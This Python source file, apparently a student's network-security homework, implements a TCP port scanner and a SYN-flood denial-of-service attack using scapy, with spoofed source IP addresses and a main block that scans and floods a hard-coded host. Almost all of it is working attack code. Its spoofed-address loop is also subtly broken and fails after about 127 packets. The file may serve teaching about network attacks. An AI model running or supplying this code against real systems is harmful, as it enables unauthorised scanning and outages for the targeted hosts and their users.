#!/usr/bin/env python
__author__ = 'Parth'

# USES PYTHON 3

# Homework Number: 7
# Name: Parth Patel
# ECN Login: patel344
# Due Date: March 21, 2017

import socket
from scapy.all import *

class TcpAttack(object):
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []

    def scanTarget(self, rangeStart, rangeEnd):
        # Creating file object
        FILEOUT = open("openports.txt", 'w')

        # Going through each port in user-defined range to see if open
        for test in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Will briefly probe each port to not make it take too long
            sock.settimeout(0.1)

            try:
                # Establish initial connection with host via IP, port pair
                sock.connect((self.targetIP, test))
                FILEOUT.write(str(test))
                FILEOUT.write(" ")
                self.open_ports.append(test)
            except Exception as e:
                pass

    def attackTarget(self, port):

        # The user must run as sudo, otherwise will result in seg fault

        # First see if port is open before performing DOS attack
        self.scanTarget(port, port)
        if port not in self.open_ports:
            print("Port not open")
            return 0

        # Assignment dictates to send arbritrary # of SYN packets
        #for i in range(10000):
        count = 0
        while(1):
            j = list(range(128))
            count += 1
            self.spoofIP = "10.186." + str(j[count]) + "." + str(j[count])
            print(self.spoofIP)
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(str(e))
        return 1
if __name__ == '__main__':
    t = TcpAttack("10.186.79.142", "192.168.0.1")
    t.scanTarget(0, 1000)
    t.attackTarget(80)